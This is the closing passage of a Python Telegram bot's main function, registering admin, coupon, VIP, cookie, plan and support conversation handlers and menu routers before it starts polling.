            GET_VIP_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_vip_days)],
            GET_VIP_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_vip_limit_save)],
            GET_ADMIN_COUPON_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_coupon_code)],
            GET_COUPON_LIMIT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_admin_coupon_limit)],
            GET_DAILY_COUPON: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_daily_coupon_text)],
            GET_USER_CHECK: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_user_check_id)],
            GET_NOTICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_notice_text)]
        },
        fallbacks=[MessageHandler(filters.Regex("^❌ Cancel$"), cancel)],
        name="admin_flow", persistent=False
    )
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    
    # P.R.C. BD ওনারশিপ ক্রেডিট কমান্ড হ্যান্ডলারসমূহ
    app.add_handler(CommandHandler("prc", prc_credit_command))
    app.add_handler(CommandHandler("rakib", prc_credit_command))
    
    app.add_handler(cookie_conv)
    app.add_handler(plan_conv)
    app.add_handler(support_conv)
    app.add_handler(admin_conv)
    
    app.add_handler(CallbackQueryHandler(handle_admin_callback))
    app.add_handler(MessageHandler(filters.REPLY & filters.Chat(chat_id=ADMIN_ID), handle_admin_reply_to_support))
    
    app.add_handler(MessageHandler(filters.Regex("^👤 Profile$"), show_profile))
    app.add_handler(MessageHandler(filters.Regex("^📜 Notice$"), show_notice))
    app.add_handler(MessageHandler(filters.Regex("^(📊 Status|👑 VIP User|📁 Export Excel|🔌 Toggle Cookie|🔙 Main Menu)$"), admin_actions_router))
    
    print("Bot system initialized and running smoothly with Database Persistence...")
    app.run_polling()

if __name__ == "__main__":
    main()
